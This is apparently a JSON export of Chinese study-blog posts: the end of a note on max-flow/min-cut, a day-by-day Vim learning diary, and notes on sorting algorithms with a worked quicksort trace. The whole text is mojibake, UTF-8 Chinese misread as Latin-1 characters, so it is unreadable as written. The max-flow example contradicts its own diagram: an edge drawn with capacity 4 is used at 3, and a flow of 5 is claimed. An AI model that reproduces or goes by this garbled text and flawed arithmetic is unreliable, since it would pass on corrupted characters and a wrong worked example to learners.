æœ€å°å‰²ï¼šåœ¨æ‰€æœ‰å¯èƒ½çš„å‰²ä¸­ï¼Œ**è·¨è¶Šä¸¤ä¸ªé›†åˆçš„è¾¹çš„å®¹é‡ä¹‹å’Œæœ€å°çš„å‰²**ã€‚\n\n- é—®é¢˜ï¼šå°†å›¾ä¸­ç‚¹é›†åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä½¿å¾—æºç‚¹åœ¨ä¸€ä¾§ï¼Œæ±‡ç‚¹åœ¨å¦ä¸€ä¾§ï¼Œå‰²æ‰çš„è¾¹å®¹é‡æ€»å’Œæœ€å°ã€‚\n- å®šç†ï¼šæœ€å¤§æµ = æœ€å°å‰²ã€‚\n\t**åœ¨ä¸€ä¸ªæœ‰å‘å›¾ä¸­ï¼Œä»æºç‚¹ `S` åˆ°æ±‡ç‚¹ `T` çš„æœ€å¤§æµçš„å¤§å°ï¼Œç­‰äºä» `S` åˆ° `T` çš„æœ€å°å‰²çš„å®¹é‡ã€‚**\n\n\n> æœ€å¤§æµ = èƒ½ä»æ°´åº“ `S` é€åˆ°åŸå¸‚ `T` çš„æœ€å¤šæ°´é‡\n>  æœ€å°å‰² = ä¸€åˆ€ä¸‹å»èƒ½é˜»æ–­çš„æœ€å°æ€»æ°´æµï¼ˆæŠŠæŸäº›ç®¡é“åˆ‡æ‰ï¼‰\n> æ¢å¥è¯è¯´ï¼š\n> æœ€å¤§ä½ èƒ½é€çš„ = æœ€å°‘åˆ«äººèƒ½æ‹¦çš„\n\n\n```markdown\nS --(3)--> A --(2)--> T\n \\                  /\n  \\----(4)--------/\n\n```\næœ€å¤§æµæ˜¯ 5ï¼ˆSâ†’Aâ†’T èµ° 2ï¼ŒSâ†’T èµ° 3ï¼‰\næœ€å°å‰²æ˜¯å‰²æ–­ `Sâ†’T` å’Œ `Aâ†’T`ï¼ˆå®¹é‡æ˜¯ 3+2=5ï¼‰\nä»–ä»¬ç›¸ç­‰ï¼Œå®šç†æˆç«‹ã€‚\n\n---\n\n| æœ¯è¯­        | å®šä¹‰ï¼ˆé€šä¿—è§£é‡Šï¼‰ |\n|-------------|------------------|\n| ç½‘ç»œæµå›¾    | ä¸€ä¸ªå¸¦æœ‰å®¹é‡é™åˆ¶çš„æœ‰å‘å›¾ï¼Œæ¯æ¡è¾¹è¡¨ç¤ºâ€œèƒ½å®¹çº³å¤šå°‘æµé‡â€ã€‚ |\n| æºç‚¹ï¼ˆSï¼‰   | æµé‡çš„èµ·ç‚¹ï¼Œåƒæ˜¯â€œæ°´åº“â€æˆ–â€œå·¥å‚â€ã€‚ |\n| æ±‡ç‚¹ï¼ˆTï¼‰   | æµé‡çš„ç»ˆç‚¹ï¼Œåƒæ˜¯â€œåŸå¸‚â€æˆ–â€œæ¶ˆè´¹è€…â€ã€‚ |\n| æµé‡ï¼ˆFlowï¼‰| å®é™…é€šè¿‡è¾¹çš„æµé‡ï¼Œä¸èƒ½è¶…è¿‡è¾¹çš„å®¹é‡ã€‚ |\n| å®¹é‡ï¼ˆCapacityï¼‰ | è¾¹æ‰€èƒ½æ‰¿å—çš„æœ€å¤§æµé‡ï¼Œç›¸å½“äºâ€œç®¡é“ç²—ç»†â€ã€‚ |\n| æ®‹é‡ç½‘ç»œ    | å½“å‰æµé‡çŠ¶æ€ä¸‹ï¼Œå›¾ä¸­è¿˜å¯ä»¥ç»§ç»­â€œèµ°â€çš„è·¯å¾„ä¸å®¹é‡ã€‚ |\n| å¢å¹¿è·¯      | åœ¨æ®‹é‡ç½‘ç»œä¸­ï¼Œä»æºç‚¹åˆ°æ±‡ç‚¹è¿˜å¯ä»¥â€œåŠ æµâ€çš„è·¯å¾„ã€‚ |\n| æœ€å¤§æµ      | ä»æºç‚¹åˆ°æ±‡ç‚¹èƒ½â€œåŠ â€ä¸Šçš„æœ€å¤§æ€»æµé‡ã€‚ |\n| å‰²ï¼ˆCutï¼‰   | æŠŠå›¾çš„ç‚¹åˆ†æˆä¸¤ä¸ªé›†åˆï¼Œæºç‚¹åœ¨ä¸€è¾¹ï¼Œæ±‡ç‚¹åœ¨å¦ä¸€è¾¹ã€‚ |\n| å‰²çš„å®¹é‡    | ä»æºç‚¹é›†åˆé€šå‘æ±‡ç‚¹é›†åˆçš„è¾¹çš„å®¹é‡æ€»å’Œã€‚ |\n| æœ€å°å‰²      | æ‰€æœ‰å¯èƒ½å‰²ä¸­ï¼Œå®¹é‡æœ€å°çš„ä¸€ä¸ªï¼Œè¡¨ç¤ºâ€œæœ€å°é˜»æ–­èƒ½åŠ›â€ã€‚ |\n| æœ€å¤§æµæœ€å°å‰²å®šç† | æœ€å¤§èƒ½é€šè¿‡çš„æµé‡ = æœ€å°èƒ½æ‹¦ä¸‹çš„å‰²ã€‚ |\n| EKç®—æ³•ï¼ˆEdmonds-Karpï¼‰ | ä½¿ç”¨ BFS æŸ¥æ‰¾å¢å¹¿è·¯ï¼Œé€æ­¥ç´¯åŠ æµé‡ï¼Œç›´åˆ°æ²¡æœ‰å¢å¹¿è·¯ã€‚æ—¶é—´å¤æ‚åº¦ O(VEÂ²)ã€‚ |\n| Dinicç®—æ³•   | æ›´å¿«çš„æœ€å¤§æµç®—æ³•ï¼ŒåŸºäºåˆ†å±‚å›¾+DFSå¢å¹¿ã€‚æ—¶é—´å¤æ‚åº¦ O(VÂ²E)ï¼ˆç¨€ç–å›¾è¾ƒä¼˜ï¼‰ã€‚ |\n\n","tags":["å­¦ä¹ ","æ•°å­¦","æ•°æ®ç»“æ„"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„","ç¦»æ•£æ•°å­¦"]},{"title":"Vim å­¦ä¹  Daily","url":"/2025/05/06/sheng-huo/ji-lu/vim-xue-xi/","content":"# Vim å­¦ä¹ \n## å­¦ä¹ å‰å“”å“”å‡ å¥\næˆ‘ç»ˆäºæ¥å­¦ä¹  vim äº†ï¼ï¼ä¹‹å‰å°±å¾ˆæƒ³åšåˆ°å†™ä»£ç æ‰”æ‰é¼ æ ‡ï¼Œç‰¹åˆ«æ˜¯é¼ æ ‡æ»šè½®ï¼ŒæŠŠæ‰‹ç¦»å¼€é”®ç›˜ç„¶ååˆæ”¾å›å»å®åœ¨æ˜¯å¤ªå½±å“ç¼–ç¨‹ä½“éªŒäº†...æ‰€ä»¥å¼€å§‹ç©ä¸€ä¸‹vimå§ã€‚è®°å½•ä¸€äº›å°æŒ‡ä»¤é¿å…æˆ‘å¿˜è®°ã€‚\n\n## DAY 1\nH J K L è¦è§¦å‘ä¸€ç§è”æƒ³çš„è¯è¿˜æ˜¯æŒºéš¾çš„ï¼Œæˆ‘ç›®å‰åªèƒ½ç”¨ä¸€ç§æœ€æ­»è®°ç¡¬èƒŒçš„æ–¹å¼ä¹ æƒ¯å®ƒã€‚\n![image.png](https://pic.moyuin.top/2025/05/06/681a1238f0ec0.png)\n\nHæœ€å·¦ï¼ŒLæœ€å³ï¼ŒJæœ‰ä¸€ä¸ªä¸‹é’©å­ï¼ŒKå°±æ˜¯æœ€åçš„å‘ä¸Šå’¯...\n\n---\nvim æœ‰ä¸‰ç§æ¨¡å¼ï¼Œé‰´äºä¹‹å‰ linux ç³»ç»Ÿçš„å½±å“æˆ‘è¿˜æ˜¯äº†è§£ä¸€äº›çš„ã€‚\n- è¾“å…¥ : è¿›å…¥ å‘½ä»¤æ¨¡å¼ \n\t`:wq` ç›´æ¥ä¿å­˜ï¼Œ`: 1` æ®è¯´å¯ä»¥è·³è½¬åˆ°ç¬¬ä¸€è¡Œã€‚\n- è¾“å…¥ i è¿›å…¥è¾“å…¥æ¨¡å¼\n\tè¿›å…¥è¾“å…¥æ¨¡å¼çš„æ—¶å€™å°±å’Œæ™®é€šçš„è¾“å…¥æ²¡å•¥åŒºåˆ«äº†ï¼Œä½†æ˜¯ä¸€äº›å¿«æ·é”®å¥½åƒç”¨ä¸äº†ï¼Œæ¯”å¦‚ctrl+Aè¿™ç§å…¨é€‰çš„ï¼Œvimæœ‰ç€è‡ªå·±çš„å…¨é€‰å‘½ä»¤ã€‚\n- è¾“å…¥ v è¿›å…¥è§†è§‰æ¨¡å¼\n\tæœ‰å•¥ç”¨è¿˜æ²¡æ‘¸ç´¢å‡ºæ¥ï¼Œåˆ°æ—¶å€™çœ‹çœ‹ã€‚\n![image.png](https://pic.moyuin.top/2025/05/06/681a12e293631.png)\n\n---\n## DAY 2\n\n`dd` åˆ é™¤å½“å‰è¡Œ\n`gg` å»ç¬¬ä¸€è¡Œ\n`u` æ’¤é”€\nå¥½ä¸ä¹ æƒ¯ğŸ˜µâ€ğŸ’«ï¼Œè¿™äº›å¾—åœ¨**normal**æ¨¡å¼ä¸‹ç”¨ã€‚\n\n---\n## DAY 3\n`p` æ˜¯ç›´æ¥ç²˜è´´\n`dG` åˆ é™¤ä¸‹é¢æ‰€æœ‰è¡Œï¼Œé…åˆ `gg` ç›´æ¥å»å¼€å¤´åšåˆ°å…¨é€‰åˆ é™¤\nnano çš„å…¨é€‰æˆ‘éƒ½ä¸ä¼šå‘¢...vim å¼€å§‹æœ‰ç‚¹ç”¨å¤„äº†ğŸ¥°\n\n---\n## DAY 4\nç„¶åè¾“å…¥ `yG` æç¤ºä¸‹å›¾ `xx lines yanked` æˆåŠŸå³å¯\n![image.png](https://pic.moyuin.top/2025/05/09/681e16be2943e.png)\n\nä½†æ˜¯è¿™æ · vim åªæ˜¯æ”¾åœ¨äº† vim å¯„å­˜å™¨é‡Œé¢ï¼Œå¯¹äº vscode çš„ vim æ’ä»¶ï¼Œéœ€è¦å¼€å¯è¿™ä¸ªåŠŸèƒ½\n`\"vim.useSystemClipboard\": true`\næ‰å¯ä»¥å¤åˆ¶åˆ°ç³»ç»Ÿå‰ªåˆ‡æ¿é‡Œã€‚\nå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨ `\"+yG` ç›´æ¥åŠ å…¥ç³»ç»Ÿå‰ªåˆ‡æ¿ï¼Œä¸è¿‡æˆ‘å«Œå®ƒéº»çƒ¦ã€‚\n![image.png](https://pic.moyuin.top/2025/05/09/681e16882c4f7.png)\n\n*è¶Šæ¥è¶Šä¹ æƒ¯ç”¨ vim å†™ä»£ç äº†*ğŸ¥°\n\n---\n## DAY 5\n`0` å»å¾€è¯¥è¡Œè¡Œé¦–\n`$` or `end` å»è¯¥è¡Œè¡Œæœ«\n\n`G` å‘ä¸‹ç§»åŠ¨åˆ°æœ€åä¸€è¡Œ\n`gg` å›åˆ°ç¬¬ä¸€è¡Œ\n`nG`é…åˆæ•°å­—ï¼Œå‰å¾€ç¬¬ n è¡Œ\n`n<space>` å»è¯¥è¡Œçš„ç¬¬ n ä¸ªå­—ç¬¦\n\n---\n## DAY 6\n`A`ç›´æ¥è·³åˆ°è¡Œå°¾ç„¶åå¼€å§‹ç¼–è¾‘\n`g_` ä¹Ÿæ˜¯è·³åˆ°æœ€åä¸€ä¸ªå­—ç¬¦\n","tags":["å­¦ä¹ ","è®¡åˆ’"],"categories":["æ—¥å¸¸å­¦ä¹ "]},{"title":"æ•°æ®ç»“æ„-æ’åºä¸æŸ¥æ‰¾","url":"/2025/04/22/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-pai-xu-yu-cha-zhao/","content":"# æ•°æ®ç»“æ„-æ’åº\n\n## æ’åºåˆ†ç±»\n### ç¨³å®šæ€§åˆ†ç±»\nè‹¥**åºåˆ—ä¸­å…³é”®å­—å€¼ç›¸ç­‰çš„èŠ‚ç‚¹ç»è¿‡æŸç§æ’åºæ–¹æ³•è¿›è¡Œæ’åºä¹‹åï¼Œä»èƒ½ä¿æŒå®ƒä»¬åœ¨æ’åºå‰çš„ç›¸å¯¹é¡ºåº**ï¼Œåˆ™ç§°è¿™ç§æ’åºæ–¹æ³•æ˜¯ç¨³å®šçš„ï¼›å¦åˆ™ï¼Œç§°è¿™ç§æ’åºæ–¹æ³•æ˜¯ä¸ç¨³å®šçš„ã€‚\n![ ](https://img.moyuin.top/i/2025/04/22/6806fc01136af.png)\n\n- ç¨³å®šæ’åºç®—æ³•ï¼š\n\t- æ’å…¥æ’åº\n\t- å†’æ³¡æ’åº\n\t- å½’å¹¶æ’åº\n- ä¸ç¨³å®šæ’åºç®—æ³•ï¼š\n\t- é€‰æ‹©æ’åº\n\t- å¸Œå°”æ’åº\n\t- å¿«é€Ÿæ’åº\n\t- å †æ’åº\n\t\n### å†…å­˜ä½¿ç”¨æƒ…å†µåˆ†ç±»\n- å†…éƒ¨æ’åºï¼šæ•°æ®å­˜å‚¨å’Œä½ç½®è°ƒæ•´å‡åœ¨å†…å­˜ä¸­è¿›è¡Œ\n- å¤–éƒ¨æ’åºï¼šå¤§éƒ¨åˆ†æ•°æ®å…ƒç´ å­˜å‚¨åœ¨å¤–å­˜ï¼Œå€ŸåŠ©å†…å­˜è¿›è¡Œä½ç½®è°ƒæ•´\n\n### æ®æ’åºå®ç°æ‰‹æ®µåˆ†ç±»\n- åŸºäºâ€œæ¯”è¾ƒ-äº¤æ¢â€çš„æ’åºï¼šé€šè¿‡å¯¹å…³é”®å­—çš„æ¯”è¾ƒï¼Œäº¤æ¢å…³é”®å­—åœ¨åºåˆ—ä¸­çš„ä½ç½® l æ’å…¥æ’åºã€å†’æ³¡æ’åºã€é€‰æ‹©æ’åºã€å¿«é€Ÿæ’åºã€å½’å¹¶æ’åºã€å¸Œå°”æ’åºã€å †æ’åº\n- åŸºäºâ€œåˆ†é…â€çš„æ’åºï¼šé€šè¿‡å°†å…ƒç´ è¿›è¡Œåˆ†é…å’Œæ”¶é›†è¿›è¡Œæ’åº l æ¡¶æ’åºã€è®¡æ•°æ’åºå’ŒåŸºæ•°æ’åº\n### éš¾æ˜“ç¨‹åº¦åˆ†ç±» \n- åŸºæœ¬æ’åºï¼šæ’å…¥æ’åºã€å†’æ³¡æ’åºã€é€‰æ‹©æ’åºã€â€¦â€¦\n- é«˜çº§æ’åºï¼šå¿«é€Ÿæ’åºã€å½’å¹¶æ’åºã€å †æ’åºã€åŸºæ•°æ’åºã€â€¦â€¦\n## ç»å…¸æ’åº\n### æ’å…¥æ’åº\n**åŸºæœ¬æ€æƒ³**ï¼šå°†ä¸€ä¸ªè®°å½•æ’å…¥åˆ°å·²ç»æ’å¥½åºçš„åºåˆ—ä¸­ï¼Œå½¢æˆä¸€ä¸ªæ–°çš„ã€è®°å½•æ•°å¢1çš„æœ‰åºåºåˆ— ã€‚\n![ ](https://img.moyuin.top/i/2025/04/22/6806fd4235798.png)\n\næˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç›´æ¥æ’å…¥æ’åºã€‚å°†`A[i]`æ’å…¥æœ‰åºåºåˆ—ï¼Œè®©å‰é¢æ‰€æœ‰çš„å…ƒç´ æ¯”å®ƒå¤§/å°ï¼Œä»è€Œå¾—åˆ°æ–°æœ‰åºåºåˆ—ã€‚\n![ ](https://img.moyuin.top/i/2025/04/22/6806fde5b07cf.png)\n\næ—¶é—´å¤æ‚åº¦ï¼šå¹³å‡ä¸º`O(n^2)`\nç©ºé—´å¤æ‚åº¦ï¼š `O(1)`\n#### **æŠ˜åŠæ’å…¥æ’åº**\näºŒåˆ†æ³•è¿›å…¥æ’åº,å³ä¸º**æŠ˜åŠæ’å…¥æ’åº**,æŸ¥æ‰¾ä½ç½®æ—¶é—´å¤æ‚åº¦ä¸º`O(logn)`,ä½†æ˜¯å…ƒç´ æŒªåŠ¨ä¾ç„¶ä¸º`O(n)`,æ‰€ä»¥æ•´ä½“çš„æ—¶é—´å¤æ‚åº¦ä¸º`O(n^2)`\n\n#### å¸Œå°”æ’åº\n**åŸºæœ¬åŸç†**ï¼šå…ˆå¯¹æ‰€æœ‰è®°å½•æŒ‰**å¢é‡**(d)è¿›è¡Œåˆ†ç»„ï¼Œç»„å†…è¿›è¡Œæ’å…¥æ’åºï¼›ç„¶åå‡å°‘å¢é‡é‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œç›´è‡³å¢é‡ä¸º1 ã€‚\n**ç”»çº¿å¯ä»¥è¿æ¥åœ¨ä¸€èµ·çš„è§†ä¸ºä¸€ä¸ªç»„ï¼Œæ¯”å¦‚ç¤ºä¾‹ï¼Œ57ï¼Œ48ï¼Œ66ä¸ºä¸€ä¸ªç»„ï¼Œè¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™57ä¸48äº¤æ¢ï¼Œäº¤æ¢åä¹Ÿè¦è€ƒè™‘57å’Œ66æ˜¯å¦å¯ä»¥äº’ç›¸äº¤æ¢ã€‚**\n![image.png](https://pic.moyuin.top/2025/05/13/6822ef3d3770b.png)\n\n\n**æ—¶é—´å¤æ‚åº¦**ï¼šä¾èµ–äºå¢é‡åºåˆ—ï¼Œæ²¡æœ‰ç¡®åˆ‡ç»“è®ºï¼Œå¯ä»¥ä¼˜äº O(n2)ï¼Œä¾‹å¦‚æŸäº›æƒ…å†µä¸‹å¯è¾¾åˆ° O(nlog2n) æˆ– O(n^3/2) ã€‚\n- é€‰ä¸€ä¸ªåˆå§‹ gapï¼Œæ¯”å¦‚ n/2\n- æŒ‰ gap æŠŠæ•°ç»„åˆ†æˆè‹¥å¹²ç»„\n- å¯¹æ¯ç»„åšæ’å…¥æ’åº\n- ç¼©å° gapï¼Œæ¯”å¦‚ gap /= 2\n- é‡å¤ç›´åˆ° gap = 1ï¼ˆå°±æ˜¯æ™®é€šæ’æ’ï¼‰\n---\n### ç®€å•é€‰æ‹©æ’åº\n**åŸºæœ¬æ€æƒ³**ï¼š**é¦–å…ˆé€‰å‡ºæœ€å°çš„é¡¹ï¼Œä¸ç¬¬ä¸€ä¸ªé¡¹äº¤æ¢ï¼›ç„¶ååœ¨å‰©ä½™é¡¹ä¸­é€‰å‡ºæ¬¡å°çš„é¡¹ï¼Œä¸ç¬¬äºŒä¸ªé¡¹äº¤æ¢**ï¼›ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æ•´ä¸ªåºåˆ—æœ‰åº ã€‚\n![image.png](https://pic.moyuin.top/2025/05/13/6822ef207dcbe.png)\n\n- **è¿‡ç¨‹**ï¼šæ¯æ¬¡åœ¨æœªæ’åºåºåˆ—ä¸­æ‰¾åˆ°æœ€å°ï¼ˆæˆ–æœ€å¤§ï¼‰å…ƒç´ ï¼Œå­˜æ”¾åˆ°æ’åºåºåˆ—çš„èµ·å§‹ä½ç½® ã€‚ Â \n- **æ€§èƒ½**ï¼š\n    - æ—¶é—´å¤æ‚åº¦ï¼šO(n^2) (æœ€ä½³ã€æœ€åã€å¹³å‡æƒ…å†µå‡ä¸º O(n^2) æ¬¡æ¯”è¾ƒ) ã€‚ Â      \n    - ç©ºé—´å¤æ‚åº¦ï¼šO(1) ã€‚\n### å †æ’åº\n**åŸºæœ¬æ€æƒ³**ï¼šå°†å¾…æ’åºåºåˆ—æ„é€ æˆä¸€ä¸ªå¤§é¡¶å †ï¼ˆæˆ–å°é¡¶å †ï¼‰ï¼Œæ­¤æ—¶å †é¡¶å…ƒç´ å³ä¸ºæœ€å¤§ï¼ˆæˆ–æœ€å°ï¼‰å€¼ã€‚å°†å…¶ä¸æœ«å°¾å…ƒç´ äº¤æ¢ï¼Œç„¶åå°†å‰©ä½™n-1ä¸ªå…ƒç´ é‡æ–°è°ƒæ•´ä¸ºå †ï¼Œé‡å¤æ­¤è¿‡ç¨‹ ã€‚\n![](https://pic.moyuin.top/2025/05/13/6822ff1c9ca87.png)\n![image.png](https://pic.moyuin.top/2025/05/13/6822ffb93f7c1.png)\n![image.png](https://pic.moyuin.top/2025/05/13/68230027ccde9.png)\n\n**è¿‡ç¨‹**ï¼šåŒ…æ‹¬å»ºå †å’Œè°ƒæ•´å †ä¸¤ä¸ªä¸»è¦æ­¥éª¤ ã€‚\nå…ˆçœ‹å»ºç«‹å †è¿‡ç¨‹å§ã€‚\n![image.png](https://pic.moyuin.top/2025/05/13/682300a81fde4.png)\n![image.png](https://pic.moyuin.top/2025/05/13/682300c8137b0.png)\n![image.png](https://pic.moyuin.top/2025/05/13/682300d308554.png)\n![image.png](https://pic.moyuin.top/2025/05/13/682300dcca925.png)\n\n\n**æ€§èƒ½**ï¼š\n- æ—¶é—´å¤æ‚åº¦ï¼šO(nlogn) ã€‚ Â \n- ç©ºé—´å¤æ‚åº¦ï¼šO(1) ã€‚\n### äº¤æ¢æ’åº\n**æ ¸å¿ƒæ€è·¯**ï¼šå¯¹åºåˆ—ä¸­çš„å…ƒç´ è¿›è¡Œå¤šæ¬¡ä¸¤ä¸¤äº¤æ¢ï¼Œä»è€Œä½¿åºåˆ—å…ƒç´ æœ‰åº ã€‚\n#### å†’æ³¡æ’åº\n**åŸºæœ¬æ€æƒ³**ï¼šä¾æ¬¡æ¯”è¾ƒç›¸é‚»ä¸¤ä¸ªå…ƒç´ ï¼Œå¦‚æœååºåˆ™äº¤æ¢ï¼Œé‡å¤æ“ä½œç›´åˆ°æ•´ä¸ªåºåˆ—æœ‰åºã€‚æ¯è¶Ÿæ’åºä¼šå°†å½“å‰æœªæ’åºéƒ¨åˆ†çš„æœ€å¤§ï¼ˆæˆ–æœ€å°ï¼‰å…ƒç´ \"å†’æ³¡\"åˆ°æœ€ç»ˆä½ç½® ã€‚\n![image.png](https://pic.moyuin.top/2025/05/13/6822f27f1f2f3.png)\n\n![image.png](https://pic.moyuin.top/2025/05/13/6822efdc611e9.png)\n\n\n**æ€§èƒ½**ï¼š\n- æ—¶é—´å¤æ‚åº¦ï¼šO(n2) ã€‚ Â \n- ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚\n#### å¿«é€Ÿæ’åº\n**åŸºæœ¬æ€æƒ³**ï¼šé€šè¿‡é€’å½’åˆ†æ²»æ–¹æ³•ï¼ŒåŸºäºè½´ç‚¹ (pivot) å°†å¾…æ’åºåºåˆ—æ‹†åˆ†æˆä¸¤ä¸ªå­åºåˆ—ï¼ˆ**å·¦è¾¹å…ƒç´ å‡å°äºç­‰äºè½´ç‚¹ï¼Œå³è¾¹å…ƒç´ å‡å¤§äºç­‰äºè½´ç‚¹**ï¼‰ï¼Œç„¶åå¯¹ä¸¤ä¸ªå­åºåˆ—åˆ†åˆ«é€’å½’æ’åº ã€‚\n\n- **é€‰å®šè½´ç‚¹**ï¼šé€šå¸¸æ˜¯å½“å‰å­åºåˆ—æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆä¹Ÿå¯ä»¥æ˜¯åˆ«çš„ï¼Œä½†è¿™æ˜¯ç»å…¸é€‰æ‹©ï¼‰ã€‚\n\n- **åˆ†åŒºè¿‡ç¨‹**ï¼š\n    - ä½¿ç”¨å·¦å³æŒ‡é’ˆï¼ˆæˆ–ä¸€ä¸ªæŒ‡é’ˆ`i`ï¼‰éå†åºåˆ—ã€‚\n    - ä¿è¯æ‰€æœ‰å°äºè½´ç‚¹çš„å…ƒç´ åœ¨å·¦è¾¹ï¼Œå¤§äºç­‰äºè½´ç‚¹çš„åœ¨å³è¾¹ã€‚\n    - **åˆ’å®šè¾¹ç•Œ**ï¼šæ‰¾å‡ºæœ€ç»ˆè½´ç‚¹åº”è¯¥æ’å…¥çš„ä½ç½®ï¼ŒæŠŠå®ƒäº¤æ¢è¿‡å»ã€‚\n    \n- **é€’å½’å¤„ç†**ï¼š\n    - ä»¥è½´ç‚¹ä¸ºç•Œï¼Œç»§ç»­åˆ†åˆ«å¯¹å·¦å­åºåˆ—å’Œå³å­åºåˆ—è¿›è¡Œå¿«é€Ÿæ’åºã€‚\n        \n- **ç»ˆæ­¢æ¡ä»¶**ï¼š\n    - å­åºåˆ—é•¿åº¦ä¸º 0 æˆ– 1ï¼Œè¯´æ˜é‚£ä¸€æ®µå·²ç»æœ‰åºï¼Œæ— éœ€ç»§ç»­å¤„ç†ã€‚\n    \n![image.png](https://pic.moyuin.top/2025/05/13/6822f634c5e24.png)\n\nå¿«æ’æ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œç»™ä¸€ä¸ªæ‹†åˆ†ç¤ºä¾‹ï¼Œè½´ç‚¹å¯»æ‰¾å’Œæ’å…¥ä½ç½®å¯»æ‰¾ä¸çœ‹å›¾ä¸è¡Œã€‚ï¼ˆ**è¿™é‡Œä½¿ç”¨çš„æ˜¯å·¦å³åŒæŒ‡é’ˆæ³•**ï¼‰ï¼š\n\nğŸ‘‡ åˆå§‹æ•°ç»„ï¼š\n```\n[10, 20, 15, 4, 1, 9, 6]\n```\næˆ‘ä»¬ä½¿ç”¨æœ€ç®€å•ç›´è§‚çš„ **Lomuto åˆ†åŒºæ³•**ï¼ˆç”¨æœ€åä¸€ä¸ªå…ƒç´ å½“è½´ç‚¹ï¼‰ã€‚æ¯ä¸€æ¬¡é€’å½’æˆ‘ä»¬éƒ½åˆ†åŒº + ç»§ç»­å¿«æ’å­æ•°ç»„ã€‚\n\n---\n âœ… ç¬¬ä¸€æ¬¡å¿«æ’ï¼ˆå…¨æ•°ç»„ï¼‰\n**æ•°ç»„**ï¼š`[10, 20, 15, 4, 1, 9, 6]`  \n**pivot**ï¼ˆè½´ç‚¹ï¼‰= `6`  \n**i = -1**\n\néå† j=0 åˆ° j=5ï¼š\n\n- `10 > 6` â†’ è·³è¿‡\n- `20 > 6` â†’ è·³è¿‡\n- `15 > 6` â†’ è·³è¿‡\n- `4 < 6` â†’ `i=0`, äº¤æ¢ `arr[0] â†” arr[3]` â†’ `[4, 20, 15, 10, 1, 9, 6]`\n- `1 < 6` â†’ `i=1`, äº¤æ¢ `arr[1] â†” arr[4]` â†’ `[4, 1, 15, 10, 20, 9, 6]`\n- `9 > 6` â†’ è·³è¿‡\n\nç»“æŸåï¼Œ`i = 1`ï¼Œäº¤æ¢ `arr[2] â†” pivot (arr[6])`  \nâ†’ æœ€ç»ˆï¼š[4, 1, 6, 10, 20, 9, 15]\n\nç°åœ¨ `6` å·²ç»åœ¨æ­£ç¡®çš„ä½ç½®äº†ï¼\n\n---\n ğŸ¯ å¿«æ’å·¦è¾¹ `[4, 1]`\npivot = `1`  \ni = -1\n- `4 > 1` â†’ è·³è¿‡\nç»“æŸå i = -1ï¼Œäº¤æ¢ `arr[0] â†” arr[1]`  \nâ†’ `[1, 4]`ï¼Œå®Œæˆäº†ï¼\n\n---\n\nğŸ¯ å¿«æ’å³è¾¹ `[10, 20, 9, 15]`\npivot = `15`  \ni = 2ï¼ˆ`6` å·²ç»åœ¨å‰é¢äº†ï¼‰\nä» j=3 å¼€å§‹ï¼š\n- `10 < 15` â†’ `i=3`, äº¤æ¢ `arr[3] â†” arr[3]`ï¼ˆè‡ªäº¤æ¢ï¼‰\n- `20 > 15` â†’ è·³è¿‡\n- `9 < 15` â†’ `i=4`, äº¤æ¢ `arr[4] â†” arr[5]`  \n    â†’ `[1, 4, 6, 10, 9, 20, 15]\näº¤æ¢ pivot `arr[6]` å’Œ `arr[5]` â†’ `[1, 4, 6, 10, 9, 15, 20]`\n\n---\n\nğŸ¯ å¿«æ’ `[10, 9]`\npivot = `9`\n- `10 > 9` â†’ è·³è¿‡\näº¤æ¢ `arr[3] â†” arr[4]`  \nâ†’ `[1, 4, 6, 9, 10, 15, 20]`\n\n---\nâœ… æœ€ç»ˆç»“æœï¼š\n```\n[1, 4, 6, 9, 10, 15, 20]\n```\n\n---\n\n\n\n\n\n**æ€§èƒ½**ï¼š\n- æ—¶é—´å¤æ‚åº¦ï¼šå¹³å‡ O(nlogn)ï¼Œæœ€å O(n2) (å½“åºåˆ—å·²åŸºæœ¬æœ‰åºæˆ–è½´ç‚¹é€‰æ‹©ä¸ä½³æ—¶) ã€‚ Â \n- ç©ºé—´å¤æ‚åº¦ (é€’å½’æ ˆæ·±åº¦)ï¼šå¹³å‡ O(logn)ï¼Œæœ€å O(n) ã€‚\n\n### å½’å¹¶æ’åº\n- **æ ¸å¿ƒæ€è·¯**ï¼šåŸºäºåˆ†æ²»æ€æƒ³ï¼Œå°†ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„æœ‰åºåºåˆ—åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„æœ‰åºåºåˆ— ã€‚ Â \n- **å½’å¹¶æ¬¡åº** ï¼š Â \n    - **è‡ªé¡¶å‘ä¸‹**ï¼šå°†åºåˆ—é€’å½’æ‹†åˆ†åˆ°å•ä¸ªå…ƒç´ ï¼Œç„¶åä¸¤ä¸¤åˆå¹¶ã€‚\n\t    ![image.png](https://pic.moyuin.top/2025/05/13/6822f2ae78335.png)\n\n    - **è‡ªåº•å‘ä¸Š**ï¼šå°†åºåˆ—çœ‹ä½œnä¸ªé•¿åº¦ä¸º1çš„æœ‰åºå­åºåˆ—ï¼Œç„¶åä¸¤ä¸¤åˆå¹¶ï¼Œç›´åˆ°åˆå¹¶ä¸ºä¸€ä¸ªåºåˆ—ã€‚\n\t    ![image.png](https://pic.moyuin.top/2025/05/13/6822f2c9130de.png)\n\n- **äºŒè·¯å½’å¹¶ (Two-Way Merge)**ï¼šå°†ä¸¤ä¸ªæœ‰åºåºåˆ—åˆå¹¶ä¸ºä¸€ä¸ªæ–°çš„æœ‰åºåºåˆ—ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(m+n)ï¼Œå…¶ä¸­må’Œnä¸ºä¸¤ä¸ªåºåˆ—çš„é•¿åº¦ ã€‚ Â \n- **æ€§èƒ½**ï¼š\n    - æ—¶é—´å¤æ‚åº¦ï¼šO(nlogn) (è‡ªé¡¶å‘ä¸‹å’Œè‡ªåº•å‘ä¸Šå‡ä¸º) ã€‚ Â \n    - ç©ºé—´å¤æ‚åº¦ï¼šO(n) (éœ€è¦é¢å¤–çš„è¾…åŠ©ç©ºé—´) ã€‚ Â \n\n- 